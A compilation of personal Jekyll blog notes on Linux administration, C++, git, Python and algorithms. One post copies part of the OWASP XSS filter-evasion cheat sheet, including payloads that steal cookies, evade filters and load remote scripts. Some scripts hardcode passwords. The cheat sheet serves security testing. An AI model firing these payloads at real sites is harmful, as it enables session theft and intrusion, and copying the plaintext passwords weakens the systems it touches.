---
layout: post
title: "My Personal Notes"
description: ""
category: 
tags: []
---
{% include JB/setup %}

### New Words

* Capricous
=erratic

How to ssh to host without username?
create a file(config) in ~/.ssh/ containing the following contents:

    Host hostname
    User username


where hostname is the your hostname you want to login in, usernmae is the username you want to use to login in .
To login in without passward, cp content of ~/.ssh/id_rsa.pub into remote host ~/.ssh/authorized_keys .


---
layout: post
title: "HowToSetupNetBootServer"
description: ""
category: 
tags: []
---
#Dnsmasq can be installed in ubuntu, by issuing following command:
sudo apt-get install dnsmasq

#prerequest:
#This server should be set up as obatiaing static ip, such as 10.0.0.254
#This file is /etc/dnsmasq.conf
#the interface conntect to lan.
interface=eth1

#anything you like
domain=yourdomain.com


#The dynamic ip range on your lan, which is managed by DHCP
dhcp-range=10.0.0.100,192.168.0.199,255.255.255.0,1h

#The filename use by client.
dhcp-boot=pxelinux.0

#something i don't really know about.
pxe-service=x86PC, "Install Linux", pxelinux

#enable built-in tftp server
enable-tftp

#Where you put the necessary files. E.g., you can download netboot.tar.gz from main page of ubuntu, and extract it into the following directory.
tftp-root=/var/lib/tftpboot



#Some note:
To find other computers among the lan(eth0), issue command:
arp-scan -interface eth0 -l

---
layout: post
title: "SubtleErros"
description: ""
category: 
tags: []
---
{% include JB/setup %}

To use function:sort in <algorithm>, be careful the compare function, it must stafisfy the following condtions:
Strick weak ordering:
* For all a, comp(a,a)==false
* if comp(a,b)==true, then comp(b,a)==false
* if comp(a,b)==true and comp(b,c)==true then comp(a,c)==true.

There is subtle case, extracted from a project.
{% highlight cpp %}

#include<iostream>
#include<cmath>
#include<assert.h>
#include<algorithm>

#define INF 1E99
using namespace std;
#define Max 101
double y[Max]={999999999999999967336168804116691273849533185806555472917961779471295845921727862608739868455469056.000000,999999999999999967336168804116691273849533185806555472917961779471295845921727862608739868455469056.000000,0.268631,0.223484,0.213363,0.203873,0.173396,0.171805,0.147066,0.135305,0.134438,0.093370,0.089916,0.081520,0.071410,0.054217,0.053685,0.051608,0.050618,0.050609,0.049449,0.047833,0.044590,0.044254,0.042998,0.041539,0.041011,0.038471,0.037384,0.037166,0.034642,0.034594,0.033551,0.033043,0.031951,0.031941,0.030951,0.030664,0.030208,0.029337,0.028936,0.028868,0.028305,0.027229,0.026968,0.026251,0.023536,0.023084,0.021200,0.021200,0.020107,0.020075,0.019947,0.018689,0.018667,0.018572,0.018344,0.017546,0.017215,0.016306,0.004288,0.015338,0.015144,0.014992,0.015005,0.012036,0.014128,0.014105,0.013985,0.013434,0.012250,0.013691,0.011912,0.011595,0.011551,0.011333,0.011783,0.011277,0.010987,0.010294,0.010187,0.008622,0.008548,0.008067,0.008052,0.007850,0.007344,0.007235,0.007142,0.007064,0.006905,0.006130,0.005503,0.005436,0.005128,0.004613,0.004352,0.004099,0.003833,0.002572,0.013791};
int x[Max+50];
bool cmp(const int a,const int b){
	if(!(a>=0&&a<Max&&b>=0&&b<Max))assert(false);
	//return false;
	return y[a]>y[b];
//	if(y[a]>=y[b])return true;
//	return false;
}
int main(){
	//int x[5]={0,1,2,3,4};
	int n=Max;
	for(int i=0;i<n;i++){
		x[i]=i;
	}
	sort(x,x+n,cmp);
	for(int i=0;i<Max;i++){
		cout<<y[x[i]]<<",";
	}
	cout<<"Hello"<<endl;
	return 0;
}
{% endhighlight %}


---
layout: post
title: "HowToUseGit"
description: ""
category: 
tags: []
---
{% include JB/setup %}
### How to use git
To use ssh push:
git add *
git commit -a -m "first commit"
git remote add origin git@github.com:ericlin1001/ProjectName.git
git push -u origin master
---
layout: post
title: "UsefulTool:Expect"
description: ""
category: 
tags: []
---
{% include JB/setup %}
### Expect

Expect is a tool for automating interactive applications such as telnet, ftp, passwd, fsck, rlogin, tip, etc. Expect really makes this stuff trivial. Expect is also useful for testing these same applications. And by adding Tk, you can also wrap interactive applications in X11 GUIs.

More details can be found:http://expect.sourceforge.net/
-----

There is my example:

	#!/usr/bin/expect
	set timeout 2
	spawn ssh middle

	expect "$"
	send "./startRun.sh\r"

	expect "Password:"
	send "cluster510\r"

	expect ":"
	send "cluster510\r"

	expect "$"
	send "su cluster\r"

	expect "Password:"
	send "cluster510\r"

	expect "$"
	send "cd ~/linjunhao/Projects\r"
	interact
	#expect eof

---
layout: post
title: "NTP SyncTime"
description: ""
category: 
tags: []
---
{% include JB/setup %}
#### A basic step about synchronizing time using ntp.
## Install Ntp Server
In master server:

		sudo apt-get install ntp
		sudo service ntpd start

## Synchronizing time according to Master Server.
In all slavery servers:

		cmd='echo [Password]|sudo -S ntpdate [Master_Server]'
		for line in $(cat machinefile)
		do
			ssh $line "$cmd";
			if [ "$?" -eq "0" ]; then
			echo Success:$line.
			else
			echo Erro:$line.
			fi
		done
		


---
layout: post
title: "offlineInstallPackages"
description: ""
category: 
tags: []
---
#### Ubuntu离线安装软件包 
# 一.应用场景
a.当我们需要在多台电脑安装同一个软件,并且这个软件很大，下载需要很长时间时
b.需要安装软件的ubuntu不能上网

# 二.离线安装包的制作
2.1.通过如下指令下载XXXX软件所需要的deb包
$ sudo apt-get -d install XXXXX
执行完上述指令后，XXXX软件的安装包就下载到了/var/cache/apt/archives目录下
2.2.生成依赖关系
1.根目录下新建一个文件夹 
$ sudo mkdir offlinePackage
2.将下载的deb包拷贝到上述新建的文件夹下
$ sudo cp -r /var/cache/apt/archives  /offlinePackage
3.修改文件夹的权限，可读可写可执行
$ sudo chmod 777 -R /offlinPackage/
4.建立deb包的依赖关系
$ sudo dpkg-scanpackages /offlinePackage/ /dev/null |gzip >/offlinePackage/Packages.gz
如果出现错误：sudo: dpkg-scanpackages: command not found
则需要安装dpkg-dev工具：
$ sudo apt-get install dpkg-dev
5.将生成的Packages.gz包复制到和deb同目录下
$ sudo cp /offlinePackage/Packages.gz /offlinePackage/archives/Packages.gz

2.3.打包成压缩包，以备后用
$ tar cvzf offlinePackage.tar.gz offlinePackage/
保存offlinePackage.tar.gz文件到U盘或服务器

# 三.在另外一台Ubuntu上离线安装
1.插入U盘或光盘，将offlinePackage.tar.gz复制到根目录下，解压
$ sudo tar -xvf offlinePackage.tar.gz
2.将安装包所在和源路径添加到系统源source.list
$ sudo vi /etc/apt/sources.list
deb file:///offlinePackage archives/
然后将所有的其他deb全部注销掉（#）
注意：我们在添加之前可以先将原来的源备份
$ sudo cp /etc/apt/sources.list /etc/apt/sources.list.back
以备以后使用
3. 更新系统源
$ sudo apt-get update
4.离线安装
此时，在没有网络的情况下，我们就可以安装我们之间下载的XXXX软件了
$ sudo apt-get  install XXXXX

# 注意：

兼容性问题，如果我们制作安装包时，用的是64位的ubuntu，那么该离线包只能在其他64位系统上安装。
有些软件对ubuntu server和ubuntu desktop版也不兼容。总之，在什么系统下制作的离线包，就在什么系统下安装。 
---
layout: post
title: "JobsInLinux"
description: ""
category: 
tags: []
---
{% include JB/setup %}



The general job control commands in Linux are:

*    jobs - list the current jobs
*    fg - resume the job that's next in the queue
*    fg %[number] - resume job [number]
*    bg - Push the next job in the queue into the background
*    bg %[number] - Push the job [number] into the background
*    kill %[number] - Kill the job numbered [number]
*    kill -[signal] %[number] - Send the signal [signal] to job number [number]
*    disown %[number] - disown the process(no more terminal will be owner), so command will be alive even after closing the terminal.

That's pretty much all of them. Note the % infront of the job number in the commands - this is what tells kill you're talking about jobs and not processes.




Just to add to the other answers, bash lets you skip the fg if you specify a job number.

For example, these are equivalent and resume the latest job:

	%
	%%
	fg
	fg %

These resume job #4:

	%4
	fg 4
---
layout: post
title: "Whats"
description: ""
category: 
tags: []
---
{% include JB/setup %}
#### What's Ctrl-C, Ctrl-D...
----

In Linux:
Ctrl-c send SIGINT signal to all process in foreground process group, always used to terminate a running program.

ctrl-z, send SIGTSTP  signal to all process in foreground process group, used to suspend a process.

ctrl-d, represents EOF.

ctrl-\ send SIGQUIT to all process in foreground process group, used to terminate a process and produces a core dump file.

### Key Function
* Ctrl-c Kill foreground process
* Ctrl-z Suspend foreground process
* Ctrl-d Terminate input, or exit shell
* Ctrl-s Suspend output
* Ctrl-q Resume output
* Ctrl-o Discard output
* Ctrl-l Clear screen
---
layout: post
title: "The Command diff"
description: ""
category: 
tags: []
---
{% include JB/setup %}
The normal output format consists of one or more hunks of differences;
each hunk shows one area where the files differ.  Normal format hunks
look like this:

CHANGE-COMMAND
< FROM-FILE-LINE
< FROM-FILE-LINE...
---
> TO-FILE-LINE
> TO-FILE-LINE...

There are three types of change commands.  Each consists of a line
number or comma-separated range of lines in the first file, a single
character indicating the kind of change to make, and a line number or
comma-separated range of lines in the second file.  All line numbers are
the original line numbers in each file.  The types of change commands
are:

`LaR'
Add the lines in range R of the second file after line L of the
first file.  For example, `8a12,15' means append lines 12-15 of
file 2 after line 8 of file 1; or, if changing file 2 into file 1,
	 delete lines 12-15 of file 2.

	 `FcT'
	 Replace the lines in range F of the first file with lines in range
	 T of the second file.  This is like a combined add and delete, but
	 more compact.  For example, `5,7c8,10' means change lines 5-7 of
	 file 1 to read as lines 8-10 of file 2; or, if changing file 2 into
	 file 1, change lines 8-10 of file 2 to read as lines 5-7 of file 1.

	 `RdL'
	 Delete the lines in range R from the first file; line L is where
	 they would have appeared in the second file had they not been
	 deleted.  For example, `5,7d3' means delete lines 5-7 of file 1;
	 or, if changing file 2 into file 1, append lines 5-7 of file 1
	 after line 3 of file 2.
---
layout: post
title: "XSSAttack"
description: ""
category: 
tags: []
---
{% include JB/setup %}

XSS Attack Sum up

-----
Original Article: http://codev587.net/xss-filter-evasion-cheat-sheet-no1.html

----
Introduction
----

This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS Cheat Sheet, which was at: http://ha.ckers.org/xss.html. That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention Cheat Sheet, the XSS (Cross Site Scripting) Prevention Cheat Sheet, was inspired by RSnake’s XSS Cheat Sheet, so we can thank him for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack cheat sheet, and so the OWASP Cheat Sheet Series was born.
Tests

This cheat sheet is for people who already understand the basics of XSS attacks but want a deep understanding of the nuances regarding filter evasion.

Please note that most of these cross site scripting vectors have been tested in the browsers listed at the bottom of the scripts.

XSS Locator

Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word “XSS” will pop up. Use this URL encoding calculator to encode the entire string. Tip: if you’re in a rush and need to quickly check a page, often times injecting the depreciated “<PLAINTEXT>” tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably:
1
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
	2
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
	3
	></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>


	XSS locator 2

	If you don’t have much space and know there is no vulnerable JavaScript on the page, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS verses &lt;XSS to see if it is vulnerable:
	1
	'';!--"<XSS>=&{()}


	No Filter Evasion

	This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):
		1
		<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>


		Image XSS using the JavaScript directive

		Image XSS using the JavaScript directive (IE7.0 doesn’t support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
				1
				<IMG SRC="javascript:alert('XSS');">


				No quotes and no semicolon
				1
				<IMG SRC=javascript:alert('XSS')>


				Case insensitive XSS attack vector
				1
				<IMG SRC=JaVaScRiPt:alert('XSS')>


				HTML entities

				The semicolons are required for this to work:
				1
				<IMG SRC=javascript:alert("XSS")>


		Grave accent obfuscation

		If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string – this is also useful because lots of cross site scripting filters don’t know about grave accents:
		1
		<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>


		Malformed A tags

		Skip the HREF attribute and get to the meat of the XXS… Submitted by David Cross ~ Verified on Chrome

		<a onmouseover=”alert(document.cookie)”>xxs link</a>

		or Chrome loves to replace missing quotes for you… if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.

		<a onmouseover=alert(document.cookie)>xxs link</a>
		Malformed IMG tags

		Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tag:
		1
		<IMG """><SCRIPT>alert("XSS")</SCRIPT>">


		fromCharCode

		if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need:
		1
		<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>


		Default SRC tag to get past filters that check SRC domain

		This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur, onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .

		Edited by Abdullah Hussam.
		1
		<IMG SRC=# onmouseover="alert('xxs')">


		Default SRC tag by leaving it empty
		1
		<IMG SRC= onmouseover="alert('xxs')">


		Default SRC tag by leaving it out entirely
		1
		<IMG onmouseover="alert('xxs')">


		On error alert
		1
		<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>


		Decimal HTML character references

		all of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). Use the XSS Calculator for more information:
		1
		<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
		2
		&#39;&#88;&#83;&#83;&#39;&#41;>


		Decimal HTML character references without trailing semicolons

		This is often effective in XSS that attempts to look for “&#XX;”, since most people don’t know about padding – up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I’ve seen this in the wild):
			1
			<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
			2
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>


			Hexadecimal HTML character references without trailing semicolons

			This is also a viable XSS attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol – which is not true with hex HTML characters). Use the XSS calculator for more information:
			1
			<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>


			Embedded tab

			Used to break up the cross site scripting attack:
			1
			<IMG SRC="jav    ascript:alert('XSS');">


			Embedded Encoded tab

			Use this one to break up XSS :
			1
			<IMG SRC="jav&#x09;ascript:alert('XSS');">


			Embedded newline to break up XSS

			Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:
			1
			<IMG SRC="jav&#x0A;ascript:alert('XSS');">


			Embedded carriage return to break up XSS

			(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I’ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
				1
				<IMG SRC="jav&#x0D;ascript:alert('XSS');">


				Null breaks up JavaScript directive

				Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim (^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00is much more useful and helped me bypass certain real world filters with a variation on this example:
				1
				perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out


				Spaces and meta chars before the JavaScript in images for XSS

				This is useful if the pattern match doesn’t take into account spaces in the word “javascript:” -which is correct since that won’t render- and makes the false assumption that you can’t have a space between the quote and the “javascript:” keyword. The actual reality is you can have any char from 1-32 in decimal:
				1
				<IMG SRC=" &#14;  javascript:alert('XSS');">


				Non-alpha-non-digit XSS

				The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example “<SCRIPT\s” != “<SCRIPT/XSS\s”:
				1
				<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>

				Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc…) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
				1
				<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

				Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.
				1
				<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>


				Extraneous open brackets

				Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:
				1
				<<SCRIPT>alert("XSS");//<</SCRIPT>


				No closing script tags

				In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don’t actually need the “></SCRIPT>” portion of this Cross Site Scripting vector. Firefox assumes it’s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they’re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
				1
				<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >


				Protocol resolution in script tags

				This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh’s protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The “.j” is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.
				1
				<SCRIPT SRC=//ha.ckers.org/.j>


				Half open HTML/JavaScript XSS vector

				Unlike Firefox the IE rendering engine doesn’t add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn’t require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close “>” tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn’t require the end “>”. As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag:
				1
				<IMG SRC="javascript:alert('XSS')"


				Double open angle brackets

				Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won’t:
				1
				<iframe src=http://ha.ckers.org/scriptlet.html <


				Escaping JavaScript escapes

				When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=”$ENV{QUERY_STRING}”;</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a=”\\”;alert(‘XSS’);//”;</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:
				1
				\";alert('XSS');//


				End title tag

				This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack:
				1
				</TITLE><SCRIPT>alert("XSS");</SCRIPT>


				INPUT image
				1
				<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">


				BODY image
				1
				<BODY BACKGROUND="javascript:alert('XSS')">


				IMG Dynsrc
				1
				<IMG DYNSRC="javascript:alert('XSS')">


				IMG lowsrc
				1
				<IMG LOWSRC="javascript:alert('XSS')">


				List-style-image

				Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
				1
				<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>


				VBscript in an image
				1
				<IMG SRC='vbscript:msgbox("XSS")'>


Livescript (older versions of Netscape only)
	1
	<IMG SRC="livescript:[code]">



---
layout: post
title: "AutoitScript"
description: ""
category: 
tags: []
---
{% include JB/setup %}
Autoit--a useful automation tool.
---
layout: post
title: "VSFTP support anonymouse"
description: ""
category: 
tags: []
---
{% include JB/setup %}
Configuration like this:
anon_root=~/ftp/anonymous
mkdir ~/ftp/anonymous/upload
where ~/ftp/anonymous doesn't have write access, ~/ftp/anonymous/upload does have wirte access.
And anonymous users upload files to ~/ftp/anonymous/upload/
~/ftp/anonymous/ may should be owned by ftp user,
	while ~/ftp/anonymous/upload/ can be owned by anyones.



---
layout: post
title: "Learning Python"
description: ""
category: 
tags: []
---
{% include JB/setup %}

#### Learning Python
----- 

Reference Url: https://docs.python.org/3.4/tutorial/ 

### Tips in IPython:
* edit _i  | edit the last input.
* edit _   | edit the last output.
* load file| load file.
* () is tuple.
* [] is list.

### Code Examples:
	def printTD(tuples,dicts):
		"""it receives two args,  tuples, dicts."""
		for i in range(len(tuples)):
			print("tuples[" + str(i) + "] = " + str(tuples[i]), end = ',');
		keys = sorted(dicts.keys(), key = lambda x:len(x));
		for j in keys:
			print("dicts[" + str(j) + "] = " + str(dicts[j]), end = ',');

	def foo(arg0,  *tuples,  **dicts):
		"""This is foo function, it receives any number of args."""
		print("foo.__doc__ = " + foo.__doc__);
		print("foo(arg0:"+str( arg0), end = ',');
		printTD(tuples, dicts);
		print(")");
		bar( *tuples,  ** dicts);

	def bar(arg0, arg1,  *tuples,  **dicts):
		"""This is bar function"""
		print("bar.__doc__ = " + bar.__doc__);
		print("bar(arg0:" + str(arg0) + ", arg1:" + str(arg1), end = ',');
		printTD(tuples, dicts);
		print(")");
	
# Run: 
	foo("a", "1", 2, "3", mykey1 = 123, adfadfK = 123145, afadf = "afdadf")

# Output: 
	foo.__doc__  =  This is foo function,  it receives any number of args.
	foo(arg0:a, tuples[0]  =  1, tuples[1]  =  2, tuples[2]  =  3, dicts[afadf]  =  afdadf, dicts[mykey1]  =  123, dicts[adfadfK]  =  123145, )
	bar.__doc__  =  This is bar function
	bar(arg0:1, arg1:2, tuples[0]  =  3, dicts[afadf]  =  afdadf, dicts[mykey1]  =  123, dicts[adfadfK]  =  123145, )


---
layout: post
title: "SortAlgorithm"
description: ""
category: 
tags: []
---
{% include JB/setup %}
#### SortAlgorithm

--------------- 
### Median of medians
The optimal algorithm selecting kth largest element,with linear time complexity (O(n)) <br/>
Reference: https://en.wikipedia.org/wiki/Median_of_medians

<code>

	function select(list, left, right, n)
		if left = right
			return left
		loop
			pivotIndex := pivot(list, left, right)
			pivotIndex := partition(list, left, right, pivotIndex)
			if n = pivotIndex
				return n
			else if n < pivotIndex
				right := pivotIndex - 1
			else
				left := pivotIndex + 1

	function partition(list, left, right, pivotIndex)
		pivotValue := list[pivotIndex]
		swap list[pivotIndex] and list[right]  // Move pivot to end
		storeIndex := left
		for i from left to right-1
			if list[i] < pivotValue
				swap list[storeIndex] and list[i]
				increment storeIndex
		swap list[right] and list[storeIndex]  // Move pivot to its final place
		return storeIndex


	function pivot(list, left, right)
		// for 5 or less elements just get median
		if right - left < 5:
			return partition5(list, left, right)
		// otherwise move the medians of five-element subgroups to the first n/5 positions
		for i from left to right in steps of 5
			// get the median of the ith five-element subgroup
			subRight := i + 4
			if subRight > right:
				subRight := right

			median5 := partition5(list, i, subRight)
			swap list[median5] and list[left + floor((i - left)/5)]

		// compute the median of the n/5 medians-of-five
		return select(list, left, left + ceil((right - left) / 5) - 1, left + (right - left)/10)

	function partition5(list,left,right)
		//based on insertion sort.
		mid=floor((left+right)/2)
		for i from left+1 to right
			j=i;
			while j>0 && list[j-1]>list[j]
				swap(list,j-1,j);
				j=j-1
		return mid
		
</code>


### HeapSort
Reference:https://en.wikipedia.org/wiki/Heapsort

<code>

	Parent(i)     = floor((i-1) / 2)
	iLeftChild(i)  = 2*i + 1
	iRightChild(i) = 2*i + 2

	procedure heapsort(a, count) is
		input: an unordered array a of length count

		(Build the heap in array a so that largest value is at the root)
		heapify(a, count)

		(The following loop maintains the invariants that a[0:end] is a heap and every element
		 beyond end is greater than everything before it (so a[end:count] is in sorted order))
		end ← count - 1
		while end > 0 do
			(a[0] is the root and largest value. The swap moves it in front of the sorted elements.)
			swap(a[end], a[0])
			(the heap size is reduced by one)
			end ← end - 1
			(the swap ruined the heap property, so restore it)
			siftDown(a, 0, end)

	(Put elements of 'a' in heap order, in-place)
	procedure heapify(a, count) is
		(start is assigned the index in 'a' of the last parent node)
		(the last element in a 0-based array is at index count-1; find the parent of that element)
		start ← iParent(count-1)

		while start ≥ 0 do
			(sift down the node at index 'start' to the proper place such that all nodes below
			 the start index are in heap order)
			siftDown(a, start, count - 1)
			(go to the next parent node)
			start ← start - 1
		(after sifting down the root all nodes/elements are in heap order)

	(Repair the heap whose root element is at index 'start', assuming the heaps rooted at its children are valid)
	procedure siftDown(a, start, end) is
		root ← start

		while iLeftChild(root) ≤ end do    (While the root has at least one child)
			child ← iLeftChild(root)   (Left child of root)
			swap ← root                (Keeps track of child to swap with)

			if a[swap] < a[child]
				swap ← child
			(If there is a right child and that child is greater)
			if child+1 ≤ end and a[swap] < a[child+1]
				swap ← child + 1
			if swap = root
				(The root holds the largest element. Since we assume the heaps rooted at the
				 children are valid, this means that we are done.)
				return
			else
				swap(a[root], a[swap])
				root ← swap            (repeat to continue sifting down the child now)

</code>

---
layout: post
title: "SATA"
description: ""
category: 
tags: []
---
{% include JB/setup %}
#### SATA
 
The abrreviation for Serail AT(Advanced Technology) Attachment.<br/>
It's compared with PATA.


### PCI
PCI refers to Conventional PCI, and PCI is the initialism for Peripheral Component Interconnect.
---
layout: post
title: "CurrentlyUsingTools"
description: ""
category: 
tags: []
---
{% include JB/setup %}

###Python
---
##important packages:
#familiar:
numpy,matplotlib,
Qt,pyautogui

#unfamiliar:
scipy,theano,pandas

###R
---
I'm going to learn it!

###Matlab
I don't want to use it. Python is better for me.

###MPI
use MPI to parallel some program.

###Latex
Well, whether before or after learing it, i have been facinated by it. It could generates a very beautiful pdf.

###Deep Learning
It's a hot topic. I want to learn it too.
---
layout: post
title: "MacroExpansionTrick"
description: ""
category: 
tags: []
---
{% include JB/setup %}

#define foo(...) printf(__VA_ARGS__);


---
layout: post
title: "watchYoutube"
description: ""
category: 
tags: []
---
{% include JB/setup %}
How to Watch the youtube:
Set autoproxy to proxy on the following sites:
1.youtbue.com
2.googlevideo.com
---
layout: post
title: "APT Error"
description: ""
category: 
tags: []
---
{% include JB/setup %}

###How to deal with apt error?
----
1.Change /etc/apt/source.list to cn.archive.ubuntu.com/ubuntu/ (IMPORTANT!!!!) 
2.apt-get clean

---
layout: post
title: "fixonebug realtime updategithubpage"
description: ""
category: 
tags: []
---
{% include JB/setup %}
---
layout: post
title: "newtestpost"
description: ""
category: 
tags: []
---
{% include JB/setup %}
is that real?
---
layout: post
title: "Float trap"
description: ""
category: 
tags: []
---
{% include JB/setup %}
```
int i=0;
for(double x=0;x<10;x+=0.1){
	i++;
}
cout<<i<<endl;
```
Guess what's output?


```
int i=0;
for(double x=0;x<10;x+=0.1){
	i++;
	cout<<i<<setprecision(20)<<x<<endl;
}
cout<<i<<endl;
```
Well, this is accumulated float error.

---
layout: post
title: "RandFindings"
description: ""
category: 
tags: []
---
{% include JB/setup %}
2-dimensions vector(X,Y), with X,Y s.t. Uniform Distribution, 
	will leads the direction<X,Y> Not s.t. Uniform Distribution.
	They will locate more in 45,135,225,315 degree's direction.

###To correctly produce random direction in N-dimension space
	let Xi ~ N(0,1), Xi is independent with Xj, for any i,j;
	then <X1,X2...,XN> is a random direction, with r=sqrt(X1^2+X2^2+...+XN^2) ~ N.

---
layout: post
title: "How generate iid varialbes"
description: ""
category: 
tags: []
---
{% include JB/setup %}
###How to generate independent identical distribution variables(iid.)?
Well, in C++, a random number sequence is enough, becase in some sense, every number in the sequence is independent and randomized. From every position of the sequence, the following sequence still follows the same distribution.

In nutshell, to generate two more idd. vars in C++, i.e. generate N independent sequences, you just need to generate one sequence and divide it into N ones.

###Experiment
I have done a experiment, with Gaussian random distribution.
Let the G() be the function that generates Gaussian random numbers.
'''
a[1000];
b[1000];
for(i=0;i<1000;i++){
	a[i]=G();
}
for(i=0;i<1000;i++){
	b[i]=G();
}
'''
From G(), we have two sequences '''a''','''b'''. And i draw the histrograms of '''a''' and '''b''', and their shapes are still the same as Normal Distribution, and the correlation of '''a''' and '''b''' is nearly equalled to  0.
---
layout: post
title: "Relation between Density and Histrogram"
description: ""
category: 
tags: []
---
{% include JB/setup %}
Given X~f(x), ```f(x)``` is the density function of X, e.g. N(0,1).
Sampling X ```N``` times, resulting in x1,x2...xN.
Given ```W```, the minimal width of each bar,
	  we produce a histrogram ```H(x)```.
Then, there's a conclusion: ```H(x)~=f(x)*W*N```.
---
layout: post
title: "Htop note"
description: ""
category: 
tags: []
---
{% include JB/setup %}
# How to run htop?
`htop`

# What's it?
A system moniter, to know which cpu's cores is using by a process, the percentage of cpu usage, etc.

# Basic tricks
* F6 for sort by a column.
* F4 filter, to locate the processes you're interested.
* F2 setup.
---
layout: post
title: "UNUSED work for c++"
description: ""
